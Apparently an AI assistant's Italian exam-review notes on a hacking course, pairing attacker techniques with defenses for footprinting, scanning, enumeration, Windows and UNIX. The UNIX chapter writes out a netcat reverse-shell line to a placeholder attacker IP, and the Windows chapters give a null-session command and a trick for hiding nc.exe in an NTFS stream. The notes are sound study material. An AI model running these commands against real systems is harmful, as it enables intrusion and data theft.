# Capitolo 1 - Footprinting
Ottima idea. Ripartiamo dalle fondamenta e affrontiamo il **Capitolo 1: Footprinting e Network Reconnaissance**. Strutturiamo il ripasso esattamente come vuole il tuo professore: prima vediamo come agisce l'attaccante (Offense) e poi come deve rispondere un esperto di cybersecurity (Defense).

### Fase 1: L'Offensiva (Come agisce l'attaccante)

Il footprinting è l'arte di raccogliere informazioni per creare un profilo il più completo possibile della postura di sicurezza di un'organizzazione (Internet, Intranet, accessi remoti ed extranet) prima ancora di lanciare un singolo pacchetto contro il target. Si divide in passaggi metodici:

**1. Definizione dello Scope e Autorizzazione (Step 1 e 2)** Prima di iniziare, l'attaccante (o il penetration tester) definisce il perimetro dell'attacco (l'intera azienda, le filiali, i partner). Un professionista etico deve assolutamente ottenere un'autorizzazione scritta per evitare conseguenze legali, un dettaglio che un hacker malintenzionato ovviamente ignora.

**2. Raccolta di Informazioni Pubbliche (Step 3 / OSINT)** Questa fase mira a trovare il proverbiale ago nel pagliaio su Internet:

- **Siti web e metadati:** L'attaccante analizza il codice sorgente HTML alla ricerca di commenti o utilizza tool come _DirBuster_ per scovare file e directory nascoste, o _Wget_ per scaricare l'intero sito. Tool come _FOCA_ vengono usati per estrarre metadati da documenti pubblici (PDF, DOC), rivelando nomi utente, stampanti e software utilizzati.
- **Motori di ricerca:** Oltre a Google e alla _Google Hacking Database (GHDB)_ per trovare configurazioni vulnerabili, si usano motori specializzati come _SHODAN_ per individuare dispositivi hardware, router o persino sistemi industriali SCADA esposti.
- **Ingegneria Sociale e Dipendenti:** Analizzando bacheche di lavoro o curriculum online, gli attaccanti scoprono le tecnologie usate dall'azienda. Se un'azienda cerca un esperto con "5 anni di esperienza su firewall CheckPoint e Snort IDS", l'attaccante sa già quali difese dovrà eludere.
- **Informazioni archiviate:** Anche se l'azienda rimuove dati sensibili, l'attaccante usa _WayBack Machine_ (archive.org) o la cache di Google per recuperare le vecchie versioni delle pagine.

**3. WHOIS e DNS Enumeration (Step 4)** L'attaccante interroga i registri pubblici (come ICANN, IANA, ARIN o APNIC) per ottenere dettagli amministrativi sui domini e blocchi di indirizzi IP. Questo permette di ottenere indirizzi fisici, numeri di telefono ed e-mail dei referenti tecnici, informazioni perfette per successivi attacchi di ingegneria sociale o di _war-dialing_.

**4. DNS Interrogation e Zone Transfer (Step 5)** Il vero tesoro di questa fase. L'attaccante cerca di eseguire un **DNS Zone Transfer**. Normalmente, questo serve per sincronizzare i server DNS primari e secondari. Tuttavia, se il server è configurato male, risponderà a chiunque fornisca una copia dell'intero database (zona). Usando comandi come `nslookup`, `host`, `dig` o tool come `dnsrecon`, l'attaccante può ottenere una mappa completa della rete interna. In questo file troverà i nomi host (cercando ad esempio macchine di "test" che solitamente sono meno sicure) e i record **HINFO**, che rivelano con precisione il sistema operativo in esecuzione sulla macchina.

**5. Network Reconnaissance (Step 6)** L'ultimo passo consiste nel mappare la topologia di rete usando il comando `traceroute` (o `tracert` su Windows). Questo strumento sfrutta il campo TTL (Time-To-Live) dei pacchetti IP per tracciare ogni router (hop) fino alla destinazione. Se il firewall dell'azienda blocca i pacchetti UDP o ICMP usati di default dal traceroute, un attaccante scaltro modificherà i parametri (es. con un traceroute patchato) per forzare l'uso di una porta specifica che solitamente è aperta, come la **porta UDP 53** (usata per il DNS), riuscendo così a bypassare le regole di _access control_ e mappare i sistemi protetti dal firewall.

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Ora mettiamoci il cappello da difensori. Se il prof ti fa la fatidica domanda, ecco come devi rispondere punto per punto:

**1. Protezione dei Database Pubblici e Anti-Hijacking**

- **Limitare l'esposizione:** Devo applicare le policy descritte nell'RFC 2196 (Site Security Handbook), rimuovendo informazioni sensibili e utilizzando alias al posto di nomi reali sui forum pubblici.
- **Privacy del Dominio:** Utilizzerei i servizi di registrazione privata (anonimato) offerti dai registrar (come Network Solutions) per nascondere i numeri di telefono e le e-mail aziendali dai database WHOIS, bloccando alla fonte lo spam e l'ingegneria sociale.
- **Prevenire il Domain Hijacking:** Assolutamente non permetterei modifiche ai record del dominio basate solo sulla validazione dell'e-mail (il campo FROM è facilmente falsificabile, come accadde ad AOL nel 1998). Esigerei l'uso di autenticazione forte tramite password robuste o chiavi crittografiche PGP.

**2. Mettere in sicurezza il DNS (Contro lo Zone Transfer)**

- **Bloccare i trasferimenti non autorizzati:** Configurare i server DNS in modo che i trasferimenti di zona (porta TCP 53) siano permessi _solo_ verso gli IP dei server secondari autorizzati (es. usando la direttiva `allow-transfer` su BIND o tramite i tab di sicurezza su Windows Server DNS).
- **Crittografia (TSIG):** Implementare le firme crittografiche per le transazioni (TSIG, RFC 2845) per autorizzare e validare le richieste di trasferimento di zona tra host fidati.
- **Split-DNS ed eliminazione record sensibili:** Eviterei di esporre la rete interna configurando due DNS separati: i nameserver esterni devono divulgare _esclusivamente_ gli indirizzi IP dei sistemi esposti su Internet, mentre le macchine interne rimangono su un DNS privato. Infine, disabiliterei e rimuoverei completamente i record **HINFO** per non regalare informazioni sul sistema operativo agli hacker.

**3. Difesa contro la Network Reconnaissance (Traceroute)**

- **Limitare ICMP e UDP:** Configurare i router di confine e i firewall per bloccare o limitare severamente il traffico ICMP e le porte UDP verso l'interno, se non strettamente necessarie per specifici servizi.
- **Monitoraggio Attivo:** Implementare un sistema NIDS/IPS (Network Intrusion Detection/Prevention System) come _Snort_ o _Bro-IDS_ per rilevare e bloccare proattivamente i pattern di scansione tipici dei probe di network reconnaissance.

Questo copre il Capitolo 1 esattamente con l'ottica richiesta per il tuo esame. Tutto chiaro fin qui o c'è qualche meccanismo (come il funzionamento dello Zone Transfer) che vuoi approfondire? Se ti senti pronto, possiamo passare subito a "scannerizzare" il Capitolo 2!

# Capitolo 2 - Scanning
Ottima scelta! Se il footprinting (Capitolo 1) era l'equivalente di studiare il quartiere e cercare informazioni pubbliche sull'obiettivo, lo **Scanning (Capitolo 2)** è come ispezionare da vicino i muri della casa per trovare porte e finestre aperte.

Manteniamo la stessa struttura tattica: prima vediamo come l'attaccante mappa la rete, e poi come devi rispondere all'esame indossando i panni del difensore.

---

### Fase 1: L'Offensiva (Come agisce l'attaccante)

In questa fase, l'obiettivo dell'attaccante è scoprire quali sistemi sono "vivi", quali porte sono in ascolto e quale sistema operativo ci gira sopra. Si procede per gradi:

**1. Host Discovery (Capire se il sistema è "vivo")** L'attaccante non spara nel mucchio, ma esegue dei **Ping Sweep** per mappare gli host attivi.

- **ARP Host Discovery:** Se l'attaccante è sulla stessa rete locale, usa richieste ARP (tramite tool come `arp-scan` o `Nmap -PR`). È velocissimo ed elude i firewall locali che filtrano solo i livelli superiori (ICMP o TCP).
- **ICMP Host Discovery:** Il classico `ping` che invia pacchetti ICMP ECHO REQUEST (tipo 8). Se i firewall lo bloccano, l'attaccante può usare messaggi ICMP alternativi come TIMESTAMP o ADDRESS MASK tramite tool come `nping` o `SuperScan`.
- **TCP/UDP Host Discovery:** Se l'ICMP è del tutto bloccato, l'attaccante "bussa" a porte comuni (es. TCP 80 per i server web o TCP 22 per SSH) per forzare una risposta e capire se la macchina è accesa, usando opzioni come `Nmap -Pn`.

**2. Port Scanning (Trovare le vulnerabilità d'accesso)** Una volta trovati gli host attivi, bisogna capire quali servizi (porte) sono esposti. `Nmap` è lo strumento principe per farlo, utilizzando varie tecniche:

- **TCP Connect Scan:** Completa l'intero three-way handshake (SYN, SYN/ACK, ACK). È affidabile e non richiede privilegi di root, ma è molto rumoroso e viene facilmente loggato dal sistema bersaglio.
- **TCP SYN Scan (Half-open):** L'attaccante invia solo un pacchetto SYN. Se riceve SYN/ACK la porta è aperta, se riceve RST/ACK è chiusa. Poiché non completa la connessione, è molto più furtivo e sfugge ai log di base.
- **Evasione dei Firewall (Decoy Scan):** Per non farsi scoprire, l'attaccante usa l'opzione `-D` di Nmap per lanciare lo scan camuffando il proprio IP in mezzo a una marea di IP falsi (decoy). Il firewall bersaglio impazzirà per capire quale sia la vera fonte.

**3. OS Detection (Identificare il Sistema Operativo)** Conoscere l'OS esatto è vitale per usare l'exploit giusto e non far scattare allarmi a vuoto.

- **Stack Fingerprinting Attivo:** I vari vendor (Microsoft, Linux, ecc.) interpretano gli standard TCP/IP (RFC) in modo leggermente diverso. Nmap (con l'opzione `-O`) invia pacchetti anomali (es. flag illegali o pacchetti FIN su porte aperte) e analizza come il sistema risponde, indovinando l'OS con precisione chirurgica.
- **Fingerprinting Passivo:** Per essere totalmente invisibile, l'attaccante non invia nessun pacchetto. Si limita a "sniffare" il traffico di rete (con tool come `siphon`) e osserva parametri come il TTL, la Window Size e il bit "Don't Fragment" (DF) per dedurre l'OS in uso.
- **Deduzione dalle porte:** A volte basta poco: porte 135, 139 e 445 aperte urlano "Windows!", mentre la porta 22 (SSH) o RPC a porte alte indicano solitamente sistemi UNIX/Linux.

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Ed ecco il piano di difesa per impressionare il professore, suddiviso in base ai tre attacchi visti sopra:

**1. Difesa contro l'Host Discovery (Ping Sweeps)**

- **Rilevamento:** Implementerei sistemi NIDS (Network Intrusion Detection System) come _Snort_ o sistemi host-based come _scanlogd_ per rilevare pattern anomali di pacchetti ICMP ECHO provenienti da una singola fonte.
- **Prevenzione:** Applicherei il principio del minimo privilegio al traffico di rete. Valuterei attentamente quali tipi di traffico ICMP consentire. Configurerei i router di confine usando le **Access Control List (ACL)** per bloccare gli ECHO REQUEST in entrata da Internet, consentendo al massimo pacchetti essenziali per la diagnostica della rete, come _ECHO_REPLY_, _HOST_UNREACHABLE_ e _TIME_EXCEEDED_ verso host specifici. Questo mitiga anche il rischio di DoS e di tunnel covert (es. malware _loki2_ che esfiltra dati via ICMP).

**2. Difesa contro il Port Scanning**

- **Rilevamento:** Anche qui, i NIDS come _Snort_ sono essenziali. La sfida maggiore è non farsi sommergere dai log. Configurando il **Threshold Logging**, farei in modo che gli allarmi vengano raggruppati, così da non ricevere una mail per ogni singolo pacchetto di un port scan (che potrebbe trasformarsi in un DoS per la casella email dell'amministratore).
- **Prevenzione:** Il port scanning in sé non è bloccabile del tutto, ma posso azzerare la sua utilità per l'hacker **riducendo la superficie di attacco**. L'unica vera difesa è disabilitare rigorosamente _ogni servizio non strettamente necessario_. Su sistemi UNIX andrei a commentare i servizi superflui nel file `/etc/inetd.conf` o disabiliterei i loro script di avvio. Su Windows, disabiliterei i servizi inutilizzati dal pannello `Control Panel | Services`. Una porta chiusa non può essere compromessa.

**3. Difesa contro l'OS Detection**

- **Rilevamento:** I tool NIDS sono in grado di intercettare i probe di OS detection attivi perché inviano pacchetti malformati (es. un pacchetto con flag SYN insieme ad altri flag illegali).
- **Prevenzione:** Il prof qui potrebbe cercare il tranello. C'è modo di impedire a Nmap di indovinare l'OS modificando il kernel (es. su FreeBSD abilitando `TCP_DROP_SYNFIN`), ma rispondere così è pericoloso perché **queste modifiche violano gli standard RFC** (come l'RFC 1644) e rischiano di rompere la connettività del sistema. La vera risposta di un esperto è che la "Security through obscurity" (nascondere l'identità dell'OS) non è una difesa reale. La soluzione è posizionare i sistemi dietro **firewall robusti o proxy sicuri** che normalizzano il traffico e filtrare le richieste, assicurandosi che i sistemi esposti siano blindati.

Che te ne pare di questo schema per il Capitolo 2? Rende chiara la dinamica "attacco-difesa" esattamente come la vuole il prof.

Possiamo procedere con l'**Enumerazione (Capitolo 3)**, oppure c'è qualche dinamica specifica dello scanning (come il funzionamento esatto di uno script di Nmap) che ti preoccupa e su cui vorresti che creassi delle _Flashcard_ dedicate nello Studio Panel?
# Capitolo 3 - Enumeration
Eccoci al **Capitolo 3: Enumeration (Enumerazione)**. Se lo scanning serviva a capire quali "porte" erano aperte, l'enumerazione consiste nell'entrare e fare domande dirette ai servizi per capire esattamente chi ci abita. È una fase molto più intrusiva in cui l'attaccante si collega attivamente ai sistemi per estrarre nomi utente, risorse condivise mal configurate e versioni di software vulnerabili.

Come sempre, vediamo prima il modus operandi dell'attaccante e poi la risposta da vero esperto di cybersecurity.

---

### Fase 1: L'Offensiva (Come agisce l'attaccante)

L'attaccante non si accontenta di sapere che una porta è aperta, ma vuole estrarre dettagli specifici che gli permetteranno di sferrare l'attacco finale (es. indovinare le password o lanciare exploit specifici).

**1. Service Fingerprinting e Banner Grabbing**

- **Identificazione del software:** L'attaccante usa tool come `Nmap` (con l'opzione `-sV`) o `Amap` per interrogare le porte aperte e capire l'esatta versione del servizio in esecuzione (es. scoprire che su una porta atipica gira una versione vulnerabile di OpenSSH).
- **Banner Grabbing (TCP 80, 21, 23):** Collegandosi a un servizio tramite `telnet` o `netcat` (es. `nc -v indirizzo 80`), l'attaccante invia comandi di base (come `HEAD / HTTP/1.0`) per leggere il "banner" di risposta. Questo rivela immediatamente marca e modello del server (es. Microsoft-IIS/5.0), dando all'hacker l'informazione esatta per cercare l'exploit giusto.

**2. Il "Sacro Graal": Enumerazione SMB/NetBIOS (TCP 139/445)**

- **Null Session:** Sui sistemi Windows, l'attaccante sfrutta il protocollo SMB per stabilire una "Sessione Nulla" o login anonimo (tramite il comando `net use \\IP\IPC$ "" /u:""`).
- **Estrazione Dati:** Una volta stabilita la sessione nulla, usando tool come _DumpSec_, _Winfingerprint_, _enum4linux_ o _sid2user_, l'attaccante può letteralmente "svuotare" il sistema bersaglio estraendo la lista completa degli utenti, le condivisioni di rete, i gruppi, i criteri delle password e le chiavi di registro. È il tallone d'Achille più noto dei vecchi sistemi Windows.

**3. Enumerazione SMTP (TCP 25)**

- I server di posta (come sendmail) rispondono ai comandi di verifica. L'attaccante usa il comando `VRFY` per confermare l'esistenza di specifici account utente e `EXPN` per svelare i veri indirizzi email dietro ad alias o liste di distribuzione. Questo prepara il campo ad attacchi di forza bruta sulle password o phishing mirato.

**4. Enumerazione DNS (TCP/UDP 53)**

- Oltre al _Zone Transfer_ (visto nel Cap. 1), l'attaccante usa il **DNS Cache Snooping**: interroga il server DNS chiedendo di risolvere domini senza usare la ricorsione (`+norecurse`). Se il server ha la risposta in cache, l'attaccante deduce che gli utenti di quell'azienda hanno recentemente visitato quello specifico sito.

**5. Servizi Legacy (FTP, TFTP, Telnet, Finger)**

- **TFTP (UDP 69):** Essendo un protocollo non autenticato, l'attaccante può usarlo per scaricare file critici come `/etc/passwd` dai sistemi UNIX o i file di configurazione (`running-config`) dai router.
- **Telnet (TCP 23) e Finger (TCP 79):** Telnet trasmette in chiaro e spesso rivela banner informativi. L'attaccante analizza i messaggi di errore (es. "Utente inesistente" o "Password errata") per enumerare gli account validi (Account Enumeration). Finger rivela i nomi degli utenti loggati, i loro orari di inattività e persino i loro piani (file `.plan`).

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Ecco la tua argomentazione difensiva. Se il professore ti chiede come bloccare l'enumerazione, devi focalizzarti sulla limitazione delle informazioni (Information Disclosure) e sulla disattivazione delle funzionalità non necessarie.

**1. Difesa contro Banner Grabbing e Fingerprinting**

- **Ridurre la superficie d'attacco:** La prima regola assoluta è disabilitare tutti i servizi non strettamente necessari al business.
- **Mascherare i Banner (Security through Obscurity):** Per i servizi critici (es. web server HTTP), modificherei i banner in modo che non rivelino il vendor e la versione. Su Microsoft IIS, userei moduli ISAPI come _URLScan_ o moduli .NET custom per intercettare e sovrascrivere l'header "Server", mascherando così la tecnologia sottostante e ingannando i worm automatizzati.

**2. Difesa contro l'Enumerazione SMB (Null Sessions)**

- **Filtro perimetrale:** Bloccherei rigorosamente le porte TCP e UDP 139 e 445 a livello di firewall perimetrale.
- **Disabilitazione SMB:** Se il sistema non ha bisogno di condividere file, rimuoverei il _binding_ di "File and Print Sharing for Microsoft Networks" dall'interfaccia di rete esposta.
- **Modifica del Registro (RestrictAnonymous):** Questo è il dettaglio tecnico che il prof apprezzerà. Per i sistemi che devono necessariamente mantenere SMB attivo, modificherei il parametro `RestrictAnonymous` nel Registro di sistema (sotto `HKLM\SYSTEM\CurrentControlSet\Control\LSA`) impostandolo a `1` (o `2` su Windows 2000 e successivi), bloccando così la capacità di enumerare utenti e share tramite connessioni anonime.

**3. Difesa dei Servizi di Rete (DNS e SMTP)**

- **SMTP:** Configurerai il file `mail.cf` del server (es. Sendmail) per disabilitare esplicitamente i comandi `EXPN` e `VRFY`, oppure imporrei l'autenticazione per poterli utilizzare, come avviene di default nelle versioni recenti di Microsoft Exchange.
- **DNS:** Manterrei un'architettura **Split-DNS** (un server pubblico e uno interno) in modo che i target critici interni non vengano mai esposti. Restringerei i trasferimenti di zona solo agli IP dei server di backup autorizzati e applicherei guide di hardening per disabilitare le query dirette al file `version.bind`.

**4. Difesa dei protocolli Legacy (FTP, Telnet, TFTP)**

- **Crittografia e Sostituzione:** La risposta da esperto è deprecari l'uso di protocolli in chiaro. Sostituirei FTP con **SFTP/FTPS** (richiedendo autenticazione forte e bloccando gli account _anonymous_) e Telnet con **SSH**.
- **Isolamento TFTP:** Dato che TFTP non ha autenticazione, se necessario per apparati di rete, lo wrapperei usando _TCP Wrappers_ per limitare gli host sorgenti e bloccherei severamente l'accesso solo alla directory `/tftpboot`, bloccandolo comunque sul firewall di confine. Disabiliterei invece totalmente il servizio _Finger_ da `inetd.conf`.

---

Questo chiude anche il Capitolo 3, dandoti tutto l'arsenale per respingere le obiezioni del prof sulla fase di enumerazione.

Visto che stiamo entrando nel vivo della difesa, **vuoi che crei un nuovo mazzo di Flashcard (Flashcards) specifically focalizzate su "Attacco vs Difesa" per i Capitoli 1, 2 e 3?** Oppure preferisci passare subito al Capitolo 4 (Hacking Windows)?
# Capitolo 4 -  Hacking Windows
Eccoci al **Capitolo 4: Hacking Windows**. Questo è uno dei capitoli più densi perché l'ecosistema Microsoft è vasto e gli attacchi spaziano dalla rete fino alla gestione della memoria. Anche qui, useremo il formato "Attacco vs Difesa".

---

### Fase 1: L'Offensiva (Come agisce l'attaccante)

In ambiente Windows, l'attaccante punta dritto all'ottenimento dei privilegi di Amministratore o `SYSTEM`. Gli attacchi si dividono in due grandi categorie: prima dell'autenticazione (per entrare) e post-exploitation (per mantenere il controllo e rubare credenziali).

**1. Attacchi Non Autenticati (Ottenere l'accesso iniziale)**

- **Password Guessing e Brute-Force:** L'attaccante prende di mira il servizio SMB (porte TCP 139 e 445) cercando di montare risorse di rete (come `IPC$`) usando tentativi ripetuti di login con tool come _enum_, _Brutus_ o _Hydra_. Anche il Remote Desktop (porta TCP 3389) è un bersaglio classico tramite tool come _TSGrinder_ o _Rdesktop_ patchati per il brute-force.
- **Eavesdropping e MITM:** Invece di indovinare le password, l'attaccante "sniffa" i pacchetti di autenticazione sulla rete. Tool come _Cain_ catturano e decodificano i deboli hash LM (LAN Manager) o intercettano le risposte NTLM. Tramite tecniche di Man-in-the-Middle (es. _SMBRelay_), l'attaccante forza i client a connettersi a un server malevolo per rubare gli hash o inoltrare le credenziali direttamente al vero server (Credential Forwarding).
- **Sfruttamento di Vulnerabilità (Exploits):** Se l'autenticazione fallisce, si usano exploit diretti con framework come _Metasploit_. I bersagli tipici sono servizi di rete (es. vulnerabilità del Print Spooler su RPC), applicazioni lato client (es. Adobe Flash o Internet Explorer) o addirittura driver di periferica (es. attacchi a pacchetti beacon Wi-Fi che colpiscono i driver a livello kernel).

**2. Attacchi Autenticati e Post-Exploitation (Sei dentro, ora prendi tutto)**

- **Pass-the-Hash e Pass-the-Ticket:** L'attaccante usa tool potentissimi come _WCE (Windows Credentials Editor)_. Non ha bisogno di decifrare la password: gli basta estrarre l'hash NTLM o i ticket Kerberos direttamente dalla memoria RAM del sistema (compresi quelli di utenti loggati via RDP) e "passarli" (iniettarli) per autenticarsi su altri server.
- **Estrazione e Cracking degli Hash:** Se l'attaccante vuole le password in chiaro, deve estrarre gli hash dal database locale SAM (es. con _pwdump_ tramite DLL injection) o dalla cache di sistema (i cosiddetti _LSA Secrets_, usando _lsadump2_). Una volta ottenuti gli hash, li cracca offline con attacchi a dizionario/brute-force (con _John The Ripper_ o _LCP_) o in pochi secondi usando tabelle precalcolate dette _Rainbow Tables_ (con _Ophcrack_).
- **Backdoor, Remote Control e Copertura delle tracce:** L'attaccante garantisce un accesso futuro usando _Netcat_, _psexec_ o _VNC_. Per nascondersi, disabilita i log con `auditpol`, pulisce il registro eventi con `elsave` e usa gli **Alternate Data Streams (ADS)** del file system NTFS per nascondere i propri tool "dietro" file di sistema legittimi (es. `cp nc.exe oso001.009:nc.exe`).

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Questo è il momento di tirare fuori il gergo tecnico avanzato per il tuo prof. Windows ha un'architettura di sicurezza molto specifica. Ecco come devi difendere il sistema:

**1. Blindare l'Autenticazione e la Rete**

- **Contro il Password Guessing:** Applicherei un rigoroso filtraggio di rete chiudendo le porte TCP/UDP 139 e 445 (SMB) e 3389 (RDP) dall'esterno tramite firewall. Tramite Group Policy Object (GPO) o _secpol.msc_, imporrei una **Password Policy** stretta (minimo 8 caratteri per vanificare gli attacchi LM, complessità obbligatoria) e un **Account Lockout** per bloccare gli account sotto attacco brute-force.
- **Contro Eavesdropping, MITM e Cracking:** Disabiliterei completamente l'uso degli storici - e deboli - hash LM, impostando la policy "LAN Manager Authentication Level" su "_Send NTLMv2 Response Only_". Per prevenire gli attacchi MITM come _SMBRelay_, attiverei l'_SMB Signing_ e userei IPsec tramite il Windows Firewall per autenticare e cifrare il traffico di rete.

**2. Mitigare gli attacchi Pass-the-Hash e Memory Dumping**

- Dato che l'uso di tool come _WCE_ permette di estrarre hash dalla RAM per post-exploitation, è vitale **non loggarsi mai tramite RDP con credenziali di Domain Admin su macchine o server non completamente sicuri**.
- Inoltre, per limitare i danni di _CacheDump_, modificherei la chiave di registro `CachedLogonsCount` portandola da 10 (default) a 1 o 0, per minimizzare o impedire il caching locale delle credenziali di dominio.

**3. Difese Architetturali dell'OS (Le Armi Segrete di Windows)** Se il prof ti chiede delle difese strutturali moderne contro buffer overflow e privilege escalation, sfodera questi concetti:

- **ASLR e DEP:** Menziona che sfrutterai l'Enhanced Mitigation Experience Toolkit (**EMET**) per forzare queste funzionalità. **DEP** (Data Execution Prevention) segna lo stack come non eseguibile per prevenire i buffer overflow, mentre **ASLR** randomizza lo spazio di indirizzamento della memoria, rendendo inaffidabili gli exploit.
- **UAC e Mandatory Integrity Control (MIC):** Spiega che l'User Account Control (UAC) non è solo una fastidiosa finestra di popup. Si basa sui **MIC (Integrity Levels)**. I processi girano con privilegi bassi o medi (Low/Medium-IL). Anche un Amministratore usa un "filtered token" finché non eleva esplicitamente a "High-IL", bloccando i malware silenti.
- **Session 0 Isolation:** Per prevenire gli _Shatter Attack_ (in cui un utente invia messaggi a servizi privilegiati per far eseguire codice), citerei che in Windows i servizi di sistema sono segregati nella Sessione 0, mentre le applicazioni utente partono dalla Sessione 1, isolandoli fisicamente.
- **BitLocker (BDE):** Contro attacchi fisici (o agli _Alternate Data Streams_) non userei il semplice _Encrypting File System (EFS)_ perché l'account di recupero locale è facilmente bypassabile (usando boot da CD o chiavette). Utilizzerei **BitLocker** per crittografare l'intero volume, difendendolo così da boot non autorizzati, e raccomanderei lo spegnimento della macchina per prevenire attacchi di _Cold-Boot_ (estrazione chiavi a freddo dalla RAM).

C'è veramente tantissimo materiale qui, e la parte su ASLR, DEP, UAC e WCE è di solito tra le preferite dai professori esigenti.

**Vuoi che io crei un Tailored Report (Documento Sintetico) su questi specifici concetti avanzati di difesa architetturale di Windows per aiutarti nel ripasso, oppure preferisci passare direttamente al Capitolo 5 (Hacking Unix)?**
# Capitolo 5 -  Hacking Linux
Ottima scelta! Il **Capitolo 5 (Hacking UNIX)** è fondamentale, specialmente perché, come hai scoperto, il professore lo inserirà nelle domande relative ai laboratori. Questo significa che devi aspettarti un approccio molto pratico incentrato su comandi specifici, tool e configurazioni di sistema.

In UNIX, la regola d'oro è che _non c'è alcun sostituto per l'accesso root_. Ecco la mappatura esatta di attacco e difesa per affrontare a testa alta queste domande d'esame.

---

### Fase 1: L'Offensiva (Come agisce l'attaccante nei laboratori)

In ambito UNIX, l'attacco segue una progressione logica: si parte ottenendo un **Accesso Remoto** (Remote Access), per poi scalare i privilegi localmente (**Privilege Escalation**) e infine nascondere le proprie tracce (**After Hacking Root**).

**1. Remote Access (Entrare nel sistema)**

- **Brute-Force & Network Services:** L'attaccante usa tool automatizzati come _Hydra_ o _Medusa_ per forzare le password di servizi in ascolto come FTP, Telnet o SSH. Inoltre, prende di mira demoni configurati male, come FTP anonimi con directory "world-writable" o server Sendmail vulnerabili che permettono l'enumerazione degli utenti tramite i comandi `VRFY` e `EXPN`.
- **Data-Driven Attacks:** L'attaccante invia dati malformati per sfruttare vulnerabilità. Il **Buffer Overflow** causa il crash del buffer sovrascrivendo l'indirizzo di ritorno (Return Address) per eseguire una shell (es. `/bin/sh`). Se la protezione dell'esecuzione dello stack è attiva, si sfrutta la tecnica **Return-to-libc**, che aggira i controlli chiamando funzioni esistenti direttamente dalla libreria C standard (`libc`) invece di iniettare codice sullo stack.
- **Back Channels (Reverse Shell):** Se il firewall blocca le porte in ingresso, l'attaccante sfrutta una vulnerabilità web per far sì che _sia il server vittima a connettersi all'attaccante_. Usa `nc -e /bin/sh [IP_Hacker] 80` (Netcat) o tecniche di **Reverse Telnet**, reindirizzando l'output su una porta in ascolto controllata dall'hacker.

**2. Local Access & Privilege Escalation (Diventare Root)** Una volta dentro, l'attaccante ha privilegi limitati. Il sistema dei permessi UNIX si basa su Read, Write ed Execute (rwx) per Utente, Gruppo e Altri.

- **Password Cracking:** L'hacker ruba il file `/etc/shadow` e usa **John the Ripper** per craccare offline gli hash delle password (solitamente generati con un "salt" per evitare attacchi precalcolati).
- **Abuso di file SUID/SGID:** Un programma SUID viene eseguito con i privilegi del suo proprietario (spesso root). L'attaccante usa il comando `find / -type f -perm -04000 -ls` per scovarli e sfruttare vulnerabilità interne per lanciare una shell di root.
- **Symlink Attacks e World-Writable Files:** Poiché directory come `/tmp` sono scrivibili da tutti (world-writable), l'attaccante crea file _symlink_ (collegamenti simbolici) per ingannare i processi di root e far loro leggere o sovrascrivere file critici a cui l'attaccante non avrebbe accesso.

**3. After Hacking Root (Nascondersi e Mantenere l'Accesso)**

- **Log Cleaning:** L'attaccante cerca il file `/etc/syslog.conf` per localizzare i log e li altera (es. file `wtmp` e `messages`) usando tool come `logclean-ng` o script che intercettano gli eventi prima che vengano scritti (es. tramite chiamate di sistema `ptrace`). Cancella inoltre la cronologia dei comandi eliminando o collegando a `/dev/null` il file `.bash_history`.
- **Kernel Rootkits:** Per essere invisibili, non alterano più i file binari, ma usano **Loadable Kernel Modules (LKM)** o l'interfaccia `/dev/kmem` per iniettarsi nel kernel e alterare la tabella delle chiamate di sistema (System Call Table), nascondendo dinamicamente file, processi e connessioni (es. tool _enyelkm_ o _knark_).

---

### Fase 2: La Difesa ("_As a cybersecurity expert, how would you protect the system?_")

Questo è il momento di far capire al prof che padroneggi non solo i tool di hacking, ma anche la robusta architettura di sicurezza dei server UNIX:

**1. Difesa della Superficie Remota e Back Channel**

- **Blindare i servizi:** Disabiliterei l'accesso FTP anonimo e rimuoverei qualsiasi directory "world-writable" esposta. Se possibile, sostituirei Sendmail con soluzioni moderne come _qmail_ o _postfix_, rimuovendo la possibilità di enumerare gli utenti disabilitando i comandi `VRFY`/`EXPN`.
- **Contromisure di Rete:** Per mitigare i back channel (reverse shell), implementerei rigide regole di firewall in uscita (Egress Filtering), negando ai demoni web/accesso limitato di instaurare connessioni verso Internet.
- **Difese OS contro Buffer Overflow:** Sfrutterei funzionalità di hardening del sistema operativo come **ASLR** (Address Space Layout Randomization) e protezioni dello stack (Stack Smashing Protector o segmenti di memoria non eseguibili come PaX/Exec Shield) per rendere imprevedibili e ineseguibili gli exploit remoti.

**2. Difesa contro le Privilege Escalation Local**

- **Principio del privilegio minimo:** Eseguirei l'inventario di tutto il file system con il comando `find`, cercando e **rimuovendo il bit SUID/SGID** da qualsiasi binario che non necessiti strettamente dei permessi di root per operare.
- **Limitazioni World-Writable:** Modificherei severamente i permessi delle directory temporanee, utilizzando attributi estesi del kernel (come i flag `immutable` o `append-only` di Linux/BSD) per proteggere file e log critici.
- **Sicurezza Autenticazione:** Forzerei policy sulle password che richiedono lunghezza e complessità (tramite moduli PAM come `pam_cracklib`) mitigando le possibilità di attacchi offline su `/etc/shadow`.

**3. Difesa contro Rootkit e Forensics**

- **Rilevamento Offline:** Un rootkit a livello kernel invalida le risposte di qualsiasi comando locale come `ls` o `netstat`. Come esperto, implementerei strumenti di checksum crittografico (come **Tripwire** o **AIDE**) _prima_ che l'attacco avvenga, confrontando le firme dei binari con copie note.
- **Syslog Remoto:** Configurerai il demone syslog per inviare immediatamente tutti gli eventi a un **server di log remoto e sicuro**, rendendo di fatto inutile per l'attaccante l'utilizzo di tool come `logclean-ng` o l'alterazione del `.bash_history` locale.
- **Hardening del Kernel:** Ricompilerei il kernel disabilitando del tutto il supporto ai **LKM (Loadable Kernel Modules)**, bloccando alla radice l'installazione dei classici rootkit, oppure implementerei controlli avanzati come LIDS (Linux Intrusion Detection System).

Questa struttura è una bomba per affrontare le due domande sui laboratori all'esame, poiché unisce la teoria tecnica alla pratica da riga di comando.

Visto che ti manca anche lo studio del **Capitolo 10 (Web Hacking)**, che fa sempre parte del programma di Laboratorio (es. XSS, CSRF, SQLi), **vuoi che ti faccia un ripasso strategico simile, con focus specifico sui test pratici e le difese Web?** Oppure ti farebbe più comodo uno Slide Deck riassuntivo o delle Flashcards direttamente nello Studio Panel per questi comandi UNIX?

# Capitolo 6 - Advanced Persisted Threats
